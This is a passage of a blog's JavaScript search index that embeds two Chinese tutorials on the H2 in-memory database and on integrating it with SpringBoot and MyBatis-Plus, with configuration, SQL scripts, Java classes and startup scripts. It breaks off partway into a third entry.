"use strict";var tipuesearch={pages:[{title:"SpringBoot 整合 MyBatis-Plus 与 H2 教程",url:"/posts/afd4ab85.html",text:'大纲 H2 数据库基础使用教程 SpringBoot 整合 MyBatis-Plus 与 H2 教程 前言 H2 官方文档 H2 GitHub 项目 项目介绍版本说明 框架 版本 描述 Spring Boot 2.7.11 MyBatis-Plus 3.5.3.1 H2 2.1.214 项目结构 代码下载本文所需的案例代码，可以直接从 GitHub 下载对应章节 h2-springboot-mybatis-plus。 项目文件Maven 配置文件 pom.xml 的核心配置内容如下 1234567891011121314151617181920212223242526272829303132333435363738&lt;properties&gt; &lt;spring-boot.version&gt;2.7.11&lt;/spring-boot.version&gt; &lt;mybatis-plus.version&gt;3.5.3.1&lt;/mybatis-plus.version&gt; &lt;h2.version&gt;2.1.214&lt;/h2.version&gt;&lt;/properties&gt;&lt;dependencies&gt; &lt;!-- web --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- mybatis-plus --&gt; &lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt; &lt;version&gt;${mybatis-plus.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- h2 --&gt; &lt;dependency&gt; &lt;groupId&gt;com.h2database&lt;/groupId&gt; &lt;artifactId&gt;h2&lt;/artifactId&gt; &lt;version&gt;${h2.version}&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;!-- spring-boot --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-dependencies&lt;/artifactId&gt; &lt;version&gt;${spring-boot.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt; SQL 映射文件 UserMapper.xml，MyBatis 的 SQL 映射文件 12345678910&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd" &gt;&lt;mapper namespace="com.clay.h2.mapper.UserMapper"&gt; &lt;update id="clear"&gt; truncate table `t_user` &lt;/update&gt;&lt;/mapper&gt; SQL 初始化脚本文件 schema.sql，用于初始化数据库的表结构 1234567create table if not exists `t_user` ( `id` int primary key auto_increment not null, `username` char (50) not null, `pwd` char(50) not null, `create_time` datetime not null, `update_time` datetime); data.sql，用于初始化数据库的表数据 1insert into t_user(id, username, pwd, create_time, update_time) values (0, \'zhhangsan\', \'1222\', {ts \'2022-07-27 18:47:52.69\'}, {ts \'2022-07-27 18:47:52.69\'}); SpringBoot 配置文件提示 H2 数据库支持多种连接方式和连接设置，连接数据库的 JDBC URL 对大小写不敏感。 关于 H2 的更多 JDBC URL 格式和使用示例，请看 这里 的详细介绍。 配置完整案例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051server: port: 8080spring: application: name: h2-springboot-mybatis-plus # 数据源配置 datasource: driver-class-name: org.h2.Driver type: com.zaxxer.hikari.HikariDataSource # mem 表示 H2 使用内存数据库（应用重启会丢失数据） url: jdbc:h2:mem:shopDb;DB_CLOSE_DELAY=-1;DB_CLOSE_ON_EXIT=FALSE;AUTO_RECONNECT=TRUE username: root password: 123456 # 数据库初始化 sql: init: separator: ; encoding: UTF-8 platform: h2 mode: always continue-on-error: false schema-locations: - classpath:db/schema.sql data-locations: - classpath:db/data.sql # H2 的 Web 控制台 h2: console: enabled: true settings: path: /h2-console trace: true web-allow-others: false# Mybatis-Plusmybatis-plus: mapper-locations: classpath*:/mapper/**/*.xml typeAliasesPackage: com.clay.*.entity # MyBatis-Plus 配置 global-config: db-config: id-type: AUTO banner: false # MyBatis 原生配置 configuration: map-underscore-to-camel-case: true call-setters-on-nulls: true jdbc-type-for-null: \'null\' # 打印 SQL 语句 log-impl: org.apache.ibatis.logging.stdout.StdOutImpl H2 内存数据库 若希望 H2 将数据库表的数据存储在内存中（应用重启后会丢失数据），可以使用以下的数据源配置信息。 1234567spring: datasource: driver-class-name: org.h2.Driver type: com.zaxxer.hikari.HikariDataSource url: jdbc:h2:mem:shopDb;DB_CLOSE_DELAY=-1;DB_CLOSE_ON_EXIT=FALSE;AUTO_RECONNECT=TRUE username: root password: 123456 H2 持久化数据 若希望 H2 持久化数据，可以使用以下的数据源配置信息（必须指定数据库的文件路径）。 1234567spring: datasource: driver-class-name: org.h2.Driver type: com.zaxxer.hikari.HikariDataSource url: jdbc:h2:file:/var/database/h2/shopDb;DB_CLOSE_DELAY=-1;DB_CLOSE_ON_EXIT=FALSE;AUTO_RECONNECT=TRUE username: root password: 123456 H2 兼容 MySQL 若希望 H2 兼容 MySQL，可以使用连接参数 MODE 来实现。 H2 兼容多种数据库，MODE 参数的值可以为：DB2、Derby、HSQLDB、MSSQLServer、MySQL、Oracle、PostgreSQL。 1234567spring: datasource: driver-class-name: org.h2.Driver type: com.zaxxer.hikari.HikariDataSource url: jdbc:h2:file:/var/database/h2/shopDb;MODE=MYSQL;DB_CLOSE_DELAY=-1;DB_CLOSE_ON_EXIT=FALSE;AUTO_RECONNECT=TRUE username: root password: 123456 H2 使用混合模式 若希望 H2 使用混合模式，可以使用以下的数据源配置信息（必须指定数据库的文件路径）。 值得一提的是，在默认情况下，H2 数据库同一时刻只允许一个客户端访问；设置 AUTO_SERVER=TRUE 表示启用混合模式，允许多个客户端同时连接同一个 H2 数据库，该参数不支持在内存中运行的 H2 数据库。 1234567spring: datasource: driver-class-name: org.h2.Driver type: com.zaxxer.hikari.HikariDataSource url: jdbc:h2:/var/database/h2/shopDb;AUTO_SERVER=TRUE;DB_CLOSE_DELAY=-1;AUTO_RECONNECT=TRUE username: root password: 123456 SpringBoot 不同版本之间的配置差异 使用 SpringBoot 低版本时（如 2.3.5 版本），若希望应用在启动的时候初始化数据库，则需要使用以下的配置信息。 123456789spring: datasource: continue-on-error: false # 初始化模式 initialization-mode: always # 初始化表 schema: classpath:db/schema.sql # 初始化数据 data: classpath:db/data.sql 数据库初始化参数 说明 spring.datasource.schema DDL 表初始化语句，用于在应用程序启动时创建数据库表结构，默认加载 schema.sql 文件 spring.datasource.data DML 数据插入语句，它用于在应用程序启动时向数据库表中插入一些初始化数据，默认加载 data.sql 文件 spring.datasource.continue-on-error 指定在初始化数据库时，是否遇到错误后继续执行初始化操作。默认情况下，该属性值为 false，即遇到错误时会停止初始化操作。特别注意，如果遇到错误后继续执行，可能会导致数据库结构不完整或数据不一致，因此请谨慎使用此属性。 spring.datasource.initialization-mode 数据库的初始化模式，never 表示从不初始化，embedded 表示仅初始化嵌入式的数据库，always 表示始终初始化数据库，默认值是 embedded。特别注意，如果数据库已经存在相应的表，always 模式下也会重新执行 SQL 初始化脚本，请谨慎使用此模式，否则可能会丢失数据。 配置参数说明 数据源配置参数 说明 spring.datasource.url 连接数据库的 URL spring.datasource.username 数据库的用户名 spring.datasource.password 数据库的密码 spring.datasource.driver-class-name 驱动类的全限定名 spring.datasource.type 数据源类型（连接池）的全限定名 数据库初始化参数 说明 spring.sql.init.separator 指定 SQL 语句的断句分隔符，默认为分号 ;。如果 SQL 语句中包含存储过程或游标等语句，则需要将该属性更改为适当的分隔符，例如 $$ spring.sql.init.encoding 指定 SQL 文件的编码方式，默认为 UTF-8 spring.sql.init.platform 指定 SQL 方言，默认为所有方言通用 spring.sql.init.mode 数据库的初始化模式，never 表示从不初始化，embedded 表示仅初始化嵌入式的数据库，always 表示始终初始化数据库，默认值是 embedded。特别注意，如果数据库已经存在相应的表，always 模式下也会重新执行 SQL 初始化脚本，请谨慎使用此模式，否则可能会丢失数据。 spring.sql.init.schema-locations DDL 表初始化语句，用于在应用程序启动时创建数据库表结构，默认加载 schema.sql 文件 spring.sql.init.data-locations DML 数据插入语句，它用于在应用程序启动时向数据库表中插入一些初始化数据，默认加载 data.sql 文件 spring.sql.init.continue-on-error 指定在初始化数据库时，是否遇到错误后继续执行初始化操作。默认情况下，该属性值为 false，即遇到错误时会停止初始化操作。特别注意，如果遇到错误后继续执行，可能会导致数据库结构不完整或数据不一致，因此请谨慎使用此属性。 H2 数据库连接参数 说明 AUTO_SERVER=TRUE 启用混合模式，允许多个客户端同时连接同一个 H2 数据库，该参数不支持在内存中运行的 H2 数据库 MODE=MYSQL 兼容 MySQL 数据库，该参数值可以为：DB2、Derby、HSQLDB、MSSQLServer、MySQL、Oracle、PostgreSQL DB_CLOSE_ON_EXIT=FALSE 当虚拟机退出时，并不关闭数据库 DB_CLOSE_DELAY=-1 默认情况下，当最后一个连接关闭后，H2 数据库会自动关闭。为了提高数据库的性能，可以控制延迟一定的秒数后再关闭数据库。当值设置为 10，表示延迟 10 秒 再关闭数据库，当设置为 -1，表示禁用数据库自动关闭的功能。 AUTO_RECONNECT=TRUE 连接丢失后自动重新连接 TRACE_LEVEL_SYSTEM_OUT=1 输出跟踪日志到控制台的日志级别，取值 0 为 OFF，1 为 ERROR（默认值），2 为 INFO，3 为 DEBUG TRACE_LEVEL_FILE=1 输出跟踪日志到文件的日志级别，取值 0 为 OFF，1 为 ERROR（默认值），2 为 INFO，3 为 DEBUG H2 的 Web 控制台参数 说明 spring.h2.console.enabled 启用 H2 的 Web 控制台 spring.h2.console.settings.path 指定 H2 的 Web 控制台的访问路径 spring.h2.console.settings.trace 开启 H2 的 Web 控制台的日志跟踪，方便开发调试 spring.h2.console.settings.web-allow-others 允许 H2 的 Web 控制台的远程访问 项目代码Util 类代码12345678910111213141516@Data@NoArgsConstructor@AllArgsConstructorpublic class Result&lt;T&gt; { private Integer code = 0; private String msg; private T data; public Result(T data) { this.data = data; }} Entity 类代码1234567891011121314151617181920212223242526272829303132333435@Data@ToString@TableName("t_user")public class User implements Serializable { /** * 用户主键 */ @TableId(value = "id", type = IdType.AUTO) private Integer id; /** * 用户名称 */ @TableField("username") private String username; /** * 密码 */ private String pwd; /** * 创建时间 */ @JsonFormat(timezone = "GMT+8", pattern = "yyyy-MM-dd HH:mm:ss") private Date createTime; /** * 修改时间 */ @JsonFormat(timezone = "GMT+8", pattern = "yyyy-MM-dd HH:mm:ss") private Date updateTime;} Mapper 类代码12345678public interface UserMapper extends BaseMapper&lt;User&gt; { /** * 清空表 */ void clear();} Service 类代码12345678910111213141516171819202122public interface UserService extends IService&lt;User&gt; { /** * 分页查询 * @return */ Result getByPage(); /** * 新增记录 * @param user * @return */ Result add(User user); /** * 清空数据 * @return */ Result clear();} 123456789101112131415161718192021222324252627@Servicepublic class UserServiceImpl extends ServiceImpl&lt;UserMapper, User&gt; implements UserService { @Override public Result getByPage() { Page&lt;User&gt; page = new Page&lt;&gt;(1, 10); QueryWrapper&lt;User&gt; wrapper = new QueryWrapper&lt;&gt;(); wrapper.eq("username", "zhhangsan"); this.page(page, wrapper); return new Result(page.getRecords()); } @Override @Transactional(rollbackFor = Exception.class) public Result add(User user) { user.setCreateTime(new Date()); return new Result(this.save(user)); } @Override @Transactional(rollbackFor = Exception.class) public Result clear() { this.baseMapper.clear(); return new Result(); }} Controller 类代码1234567891011121314151617181920212223@RestController@RequestMapping("/user")public class UserController { @Autowired private UserService userService; @GetMapping("/page") public Result getByPage() { return userService.getByPage(); } @PostMapping("/add") public Result add(@RequestBody User user) { return userService.add(user); } @DeleteMapping("/clear") public Result clear() { return userService.clear(); }} MyBatis-Plus 配置类代码123456789101112131415@Configuration@MapperScan("com.clay.h2.mapper")public class MyBatisPlusConfig { /** * 分页插件 */ @Bean public MybatisPlusInterceptor mybatisPlusInterceptor() { MybatisPlusInterceptor interceptor = new MybatisPlusInterceptor(); interceptor.addInnerInterceptor(new PaginationInnerInterceptor(DbType.H2)); return interceptor; }} 项目测试访问 H2 的 Web 控制台启动 SpringBoot 项目后，打开浏览器访问 http://127.0.0.1:8080/h2-console，若 H2 的 Web 控制台能正常访问，且连接 H2 数据库后能看到已创建的数据库表（如下图），则说明内嵌的 H2 数据库启动成功。 H2 数据库连接 在浏览器页面连接 H2 数据库时，使用的账号、密码与 JDBC URL 都是在 SpringBoot 的配置文件 application.yml 中指定的。 API 接口调用启动 SpringBoot 项目后，使用 PostMan 等工具测试以下接口，若能得到正常的响应结果，则说明 MyBatis-Plus 成功连接并操作 H2 数据库。 API 名称 API 地址 请求方法 新增用户 http://127.0.0.1:8080/user/add/ POST 分页查询用户 http://127.0.0.1:8080/user/page/ GET 删除所有用户 http://127.0.0.1:8080/user/clear/ DELETE 常见问题版本兼容问题当访问一个别人创建好的本地 H2 数据库文件，此时很有可能默认的 H2 版本不兼容导致 SpringBoot 应用启动报错（如下） 1org.h2.jdbc.JdbcSQLNonTransientException: General error: "java.lang.IllegalStateException: Unable to read the page at position 70368748811782 [1.4.200/6]" [50000-200] 解决方法是弄清楚对方本地的数据库文件是 H2 哪个版本创建的，然后手动指定 Maven 配置文件中的 H2 版本号即可（如下） 12345&lt;dependency&gt; &lt;groupId&gt;com.h2database&lt;/groupId&gt; &lt;artifactId&gt;h2&lt;/artifactId&gt; &lt;version&gt;2.1.214&lt;/version&gt;&lt;/dependency&gt; 参考资料 H2 兼容 MySQL 内存数据库－H2 简介与实践 SpringBoot 启动时自动创建数据库表 SpringBoot 集成 MybatisPlus、H2 纯内存数据库实战 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 数据库"},{title:"H2 数据库基础使用教程",url:"/posts/dfc4cb86.html",text:'大纲 H2 数据库基础使用教程 SpringBoot 整合 MyBatis-Plus 与 H2 教程 前言在开发或学习时，有时候想编写一个数据库操作的小 Demo，但又不想利用 MySQL、Oracle 等数据库进行建库建表操作，因为只想写个小案例，感觉没必要弄个很大很麻烦的数据库。而且这个案例中的数据用完之后就不再需要了，所以也不需要进行数据的持久化操作。那有没有什么方案可以满足这个需求呢？答案是肯定的，H2 是一款内存数据库，适合在学习阶段、开发阶段调试代码使用，并不适用于生产阶段，可以满足学习与调试代码的需求。 H2 基础使用H2 的介绍H2 简介H2 数据库是一个用 Java 开发的内嵌式 (内存级别) 关系型数据库，它本身只是一个类库，也就是只有一个 Jar 文件，可以直接嵌入到 Java 项目中。H2 数据库又被称为内存数据库，因为它支持在内存中创建数据库和表。所以如果使用 H2 数据库的内存模式，那么创建的数据库和表都只是保存在内存中，一旦服务器重启，那么内存中的数据库和表将不存在了。 H2 优点 纯 Java 编写，不受平台的限制； 只有一个 Jar 文件，适合作为嵌入式数据库使用； H2 提供了一个十分方便的 Web 控制台用于操作和管理数据库； 功能完整，支持标准 SQL 和 JDBC，麻雀虽小五脏俱全； 支持内嵌模式、服务器模式和集群； H2 用途H2 主要有如下三个用途： 最常使用的用途就在于可以同应用程序一起打包发布，可以非常方便地存储少量的结构化数据； 可以用于单元测试，H2 启动速度快，而且可以关闭持久化功能，每一个用例执行完随即还原到初始状态； 可以作为缓存，即当内存数据库使用，作为 NoSQL 的一个补充。当某些场景下数据模型必须为关系型，可以拿它充当 Memcached 使用，作为后端 MySQL/Oracle 的一个缓冲层，缓存一些不经常变化但需要频繁访问的数据，比如字典表、权限表等。 H2 与其他数据库对比提示 完整的数据库对比图表请点击 这里 查看。 H2 的 3 种运行模式内嵌模式 (Embedded Mode)使用 JDBC 的本地连接。在内嵌模式下，应用程序和 H2 数据库处在同一个 JVM 中，应用程序通过 JDBC 连接数据库。内嵌模式可以实现持久化，但同一时刻只能有一个客户端连接数据库。内嵌模式是最快也是最容易的连接方式，性能也比较好。缺点是数据库无论什么时候，都只能在一个虚拟机（和类加载器）中打开。内嵌模式与所有模式一样，支持持久化和内存数据库。对并发打开数据库的数量或者打开连接的数量没有限制。 服务器模式 (Server Mode)使用 JDBC 或 ODBC 在 TCP/IP 基础上的远程连接。使用服务器模式和内嵌模式一样，只不过它可以跑在另一个进程里。服务器模式比内嵌模式慢，因为所有数据都通过 TCP/IP 协议传输。与所有模式一样，支持持久化和内存数据库。对每个数据库服务器并发打开的数据库数量或者打开连接的数量没有限制。 混合模式 (Mixed Mode)混合模式是内嵌模式和服务器模式的组合。混合模式集合了内嵌模式和服务模式的优点，使得数据库的性能和内嵌模式一样高，同时又支持多个应用同时连接同一个数据库。第一个应用通过内嵌模式与数据库建立连接，同时也作为一个独立的服务器启动，而其他的应用 (运行在不同的进程或是虚拟机上) 可以同时访问同样的数据库。第一个应用程序的本地连接与内嵌模式的连接性能一样快，而其它应用的连接性能理论上会差一点。H2 服务器可以从应用程序内（使用 H2 服务器的 API）启动或停止，或自动（自动混合模式）。当使用自动混合模式时，所有想要连接到数据库的客户端（无论是本地连接还是远程连接）都可以使用完全相同的数据库 URL 来实现连接。值得注意的是，H2 在混合模式下不支持内存数据库，即数据库必须持久化。 H2 的 3 种连接方式 第一种连接方式，以内嵌模式 (内存) 连接 H2 数据库。H2 支持在内存中创建数据库和表。特别注意，如果使用 H2 数据库的内存模式，那么创建的数据库和表都只是保存在内存中，一旦服务器重启，那么内存中的数据库和表就不存在了。 连接语法 连接示例 说明 jdbc:h2:mem:&lt;databaseName&gt; jdbc:h2:mem:testDb 数据库的数据只存在内存中 第二种连接方式，以内嵌模式 (本地文件) 连接 H2 数据库。这种连接方式在默认情况下，同一时刻只允许有一个客户端连接到 H2 数据库。当有客户端连接到 H2 数据库之后，此时数据库文件就会被锁定，那么其他客户端就无法再建立连接。 连接语法 连接示例 说明 jdbc:h2:[file:][&lt;path&gt;]&lt;databaseName&gt; jdbc:h2:~/testDb，连接位于当前用户目录下的 testDb 数据库 jdbc:h2:file:./testDb，连接位于当前程序所在目录下的 testDb 数据库 jdbc:h2:file:/h2/data/testDb，适用于 Linux 系统 jdbc:h2:file:E:/h2/data/testDb，适用于 Windows 系统 会将数据库的数据持久化到文件中 jdbc:h2:[file:][&lt;path&gt;]&lt;databaseName&gt;;AUTO_SERVER=TRUE jdbc:h2:~/testDb;AUTO_SERVER=TRUE jdbc:h2:file:./testDb;AUTO_SERVER=TRUE jdbc:h2:file:/h2/data/testDb;AUTO_SERVER=TRUE jdbc:h2:file:E:/h2/data/testDb;AUTO_SERVER=TRUE 启用混合模式，允许多个客户端同时连接同一个 H2 数据库，该参数不支持在内存中运行的 H2 数据库 第三种连接方式，使用支持 TCP/IP 的服务器模式 (远程连接) 连接 H2 数据库。这种连接方式和其他数据库的连接方式类似，是基于 Service 的形式进行连接的，因此允许多个客户端同时连接到 H2 数据库。 连接语法 连接示例 说明 jdbc:h2:tcp://&lt;server&gt;[:&lt;port&gt;]/[&lt;path&gt;]&lt;databaseName&gt; jdbc:h2:tcp://localhost/~/testDb jdbc:h2:ssl://&lt;server&gt;[:&lt;port&gt;]/[&lt;path&gt;]&lt;databaseName&gt; jdbc:h2:ssl://localhost/~/testDb 支持 SSL 连接 安装 H2 的 Web 控制台H2 的 Web 控制台是一个基于浏览器的 GUI 数据库管理工具，可以很方便地管理 H2 数据库。它的作用就相当于 PhpMyAdmin，一般情况下可以在开发环境启动 H2 的 Web 控制台。 H2 数据库下载地址可以在官网上选择一个版本进行下载，可以下载安装器或者直接下载软件包。这里建议选择 All Platforms 版本，因为解压文件后，既可用于 Windows 平台，也可用于 Linux 平台 (如下图所示)。 下载地址 http://www.h2database.com/html/main.html http://www.h2database.com/html/download.html http://www.h2database.com/html/download-archive.html H2 软件包目录结构1234567891011h2 |---bin | |---h2-2.1.214.jar //H2数据库的Jar包（驱动也在里面） | |---h2.bat //Windows控制台启动脚本 | |---h2.sh //Linux控制台启动脚本 | |---h2w.bat //Windows控制台启动脚本（不带黑屏窗口） |---docs //H2数据库的帮助文档（内有H2数据库的使用手册） |---service //通过Wrapper包装成服务 |---src //H2数据库的源代码 |---build.bat //Windows构建脚本 |---build.sh //Linux构建脚本 启动 H2 的 Web 控制台Linux 平台启动在 Linux 环境下，首先用 unzip 命令解压下载到的文件，然后在 bin 目录下，执行 h2.sh 来启动 H2 的 Web 控制台。值得一提的是，一般不建议这样直接启动，因为最好是带一些命令参数来启动 Web 控制台。 命令参数 说明 org.h2.tools.Shell 以终端方式启动 H2 的 Web 控制台，需要根据提示输入 DRIVER CLASS、URL、USER NAME、PASSWORD 等连接信息。以终端方式启动后，可以执行数据库的备份、还原、SQL 导出，SQL 导入等操作，详细教程请看 这里 org.h2.tools.Console 启动 H2 的 Web 控制台 org.h2.tools.Server 以服务器模式启动 H2 的 Web 控制台 -tcpAllowOthers 允许远程机器通过 TCP 方式访问数据库 -webAllowOthers 允许远程机器访问 H2 的 Web 控制台 -webPort 8082 指定 Web 控制台的访问端口，默认是 8082 -webSSL 启用 SSL 加密连接 在 bin 目录下创建新的启动脚本（如 h2_server.sh），内容如下（三种启动方式可以任意选择一种） 123#!/bin/shdir=$(dirname "$0")java -cp "$dir/h2-2.1.214.jar:$H2DRIVERS:$CLASSPATH" org.h2.tools.Shell "$@" 123#!/bin/shdir=$(dirname "$0")java -cp "$dir/h2-2.1.214.jar:$H2DRIVERS:$CLASSPATH" org.h2.tools.Console -webAllowOthers -webPort 8082 "$@" 123#!/bin/shdir=$(dirname "$0")java -cp "$dir/h2-2.1.214.jar:$H2DRIVERS:$CLASSPATH" org.h2.tools.Server -tcpAllowOthers -webAllowOthers -webPort 8082 "$@" 启动数据库服务 12345678# 新的启动脚本授权$ chmod +x h2_server.sh# 前台运行新的启动脚本$ bash h2_server.sh# 或者后台运行新的启动脚本$ nohup h2_server.sh &amp; 正常启动 Web 控制台（服务器模式）后，终端输出的日志信息如下 123Web Console server running at http://192.168.1.106:8082 (others can connect)TCP server running at tcp://192.168.1.106:9092 (others can connect)PG server running at pg://192.168.1.106:5435 (only local connections) Windows 平台启动进入到 H2 解压后的 bin 目录下，点击 h2.bat 或者 h2w.bat，直接运行软件。值得一提的是，点击 h2w.bat 后，此方式会在后台静默运行 H2 的 Web 控制台。 访问 H2 的 Web 控制台使用浏览器访问 H2 的 Web 控制台，URL 是 http://127.0.0.1:8082，也可以使用本机的 IP 地址（例如 http://192.168.1.106:8082） 使用 H2 的数据库创建 H2 数据库H2 成功启动后，在系统桌面底部的状态栏右下角会有一个黄色小图标（如下图红色箭头所指的位置） 可以在桌面状态栏右下角的黄色小图标处，右键点击 H2 控制台的图标，选择 Create a new database...，即可以创建一个新的数据库 出现如下窗口后，填写数据库文件的存放路径（例如 ~/demo，支持使用相对路径或者绝对路径）、访问数据库的用户名和密码，点击 Create 按钮，则会在用户目录下创建对应的数据库文件（例如 demo.mv.db） 提示 H2 数据库创建后，可能还会看到一个 demo.trace.db 文件，它是 H2 数据库的错误日志文件。 H2 数据库的文件名称 demo.mv.db，之所以里面有 mv，这是因为高版本的 H2 存储引擎默认为 mvStore。 连接 H2 数据库提示 H2 数据库连接成功后，会自动在用户目录下创建 .h2.server.properties 配置文件，用于保存数据库的历史连接信息。 用鼠标左键点击在桌面状态栏右下角的黄色小图标，此时会在浏览器打开 H2 的 Web 控制台界面（默认地址是 http://127.0.0.1:8082），填写 JDBC URL、用户名和密码后，点击 Connect 按钮就可以连接 H2 数据库 H2 数据库成功连接后，就会自动进入数据库的管理界面 输入 show databases; 和 show tables; SQL 语句，可以显示 H2 默认的数据库和表名 使用 H2 的 Web 控制台设置超级管理员密码H2 数据库连接成功后，会自动在用户目录下创建 .h2.server.properties 配置文件（如下），用于保存数据库的历史连接信息。因此，可以手动编辑 .h2.server.properties 配置文件，然后添加 webAdminPassword 参数来指定 H2 的超级管理员密码。 参数 说明 webAllowOthers 允许远程机器访问 H2 的 Web 控制台 webPort 指定 Web 控制台的访问端口，默认是 8082 webSSL 启用 SSL 加密连接 webAdminPassword 指定超级管理员密码 1234567891011121314151617181920212223242526webSSL=falsewebAdminPassword=adminwebAllowOthers=truewebPort=808210=Generic DB2|com.ibm.db2.jcc.DB2Driver|jdbc\\:db2\\://localhost/test|11=Generic Oracle|oracle.jdbc.driver.OracleDriver|jdbc\\:oracle\\:thin\\:@localhost\\:1521\\:XE|sa12=Generic MS SQL Server 2000|com.microsoft.jdbc.sqlserver.SQLServerDriver|jdbc\\:microsoft\\:sqlserver\\://localhost\\:1433;DatabaseName\\=sqlexpress|sa13=Generic MS SQL Server 2005|com.microsoft.sqlserver.jdbc.SQLServerDriver|jdbc\\:sqlserver\\://localhost;DatabaseName\\=test|sa14=Generic PostgreSQL|org.postgresql.Driver|jdbc\\:postgresql\\:test|15=Generic MySQL|com.mysql.cj.jdbc.Driver|jdbc\\:mysql\\://localhost\\:3306/test|16=Generic MariaDB|org.mariadb.jdbc.Driver|jdbc\\:mariadb\\://localhost\\:3306/test|17=Generic HSQLDB|org.hsqldb.jdbcDriver|jdbc\\:hsqldb\\:test;hsqldb.default_table_type\\=cached|sa18=Generic Derby (Server)|org.apache.derby.client.ClientAutoloadedDriver|jdbc\\:derby\\://localhost\\:1527/test;create\\=true|sa19=Generic Derby (Embedded)|org.apache.derby.iapi.jdbc.AutoloadedDriver|jdbc\\:derby\\:test;create\\=true|sa0=Generic JNDI Data Source|javax.naming.InitialContext|java\\:comp/env/jdbc/Test|sa1=Generic Teradata|com.teradata.jdbc.TeraDriver|jdbc\\:teradata\\://whomooz/|2=Generic Snowflake|com.snowflake.client.jdbc.SnowflakeDriver|jdbc\\:snowflake\\://accountName.snowflakecomputing.com|3=Generic Redshift|com.amazon.redshift.jdbc42.Driver|jdbc\\:redshift\\://endpoint\\:5439/database|4=Generic Impala|org.cloudera.impala.jdbc41.Driver|jdbc\\:impala\\://clustername\\:21050/default|5=Generic Hive 2|org.apache.hive.jdbc.HiveDriver|jdbc\\:hive2\\://clustername\\:10000/default|6=Generic Hive|org.apache.hadoop.hive.jdbc.HiveDriver|jdbc\\:hive\\://clustername\\:10000/default|7=Generic Azure SQL|com.microsoft.sqlserver.jdbc.SQLServerDriver|jdbc\\:sqlserver\\://name.database.windows.net\\:1433|8=Generic Firebird Server|org.firebirdsql.jdbc.FBDriver|jdbc\\:firebirdsql\\:localhost\\:c\\:/temp/firebird/test|sysdba9=Generic SQLite|org.sqlite.JDBC|jdbc\\:sqlite\\:test|sa20=Generic H2 (Server)|org.h2.Driver|jdbc\\:h2\\:tcp\\://localhost/~/test|sa21=Generic H2 (Embedded)|org.h2.Driver|jdbc\\:h2\\:~/demo|root 提示 若没有找到 .h2.server.properties 文件，以 Web-Server 方式首次启动 H2 后，浏览器打开 Web 控制台，点击 Save 按钮后就会自动创建对应的配置文件。 使用 H2 的配置界面使用浏览器访问 H2 的 Web 控制台，然后点击 Preferences，填写超级管理员密码后，就可以进入 H2 的配置界面 进入到 H2 的配置界面后，可以设置远程访问、端口号等信息 使用 H2 的工具界面使用浏览器访问 H2 的 Web 控制台，然后点击 Tools，填写超级管理员密码后，就可以进入 H2 的工具界面 进入 H2 的工具界面后，可以对 H2 数据库进行备份、还原、恢复、集群、运行脚本、删除文件等操作 H2 进阶使用第三方软件连接 H2 数据库H2 除了可以使用自身的 Web 控制台管理数据库之外，还可以使用 Navicat、DBeaver 这样的数据库软件来管理。这里以开源的 DBeaver 数据库管理软件举例，介绍如何使用第三方软件连接 H2 数据库。 在 DBeaver 的主界面新建数据库连接，数据库类型选择 H2 Embedded V.2，即使用内嵌模式连接 H2 数据库 特别注意 内嵌模式只允许有一个客户端连接 H2 数据库，可以简单理解为只允许有一个应用访问数据库文件。 如果 H2 数据库已经以服务器模式启动了，那么 DBeaver 的数据库类型可以选择 H2 Server，服务器模式支持多个客户端同时连接 H2 数据库。 填写 JDBC URL、用户名和密码，然后点击 测试连接 按钮或者 完成 按钮即可 成功连接 H2 数据库后，就可以看到之前创建的数据库表 附录以下表格是 H2 数据库在不同模式下的 URL 连接字串，参考自：H2 数据库使用简介 参考资料 H2 使用指南 H2 数据库使用简介 H2 内存数据库使用教程详解 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 数据库"},{title:"Spring 注解驱动开发随笔",url:"/posts/542a9813.html",text:'var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", 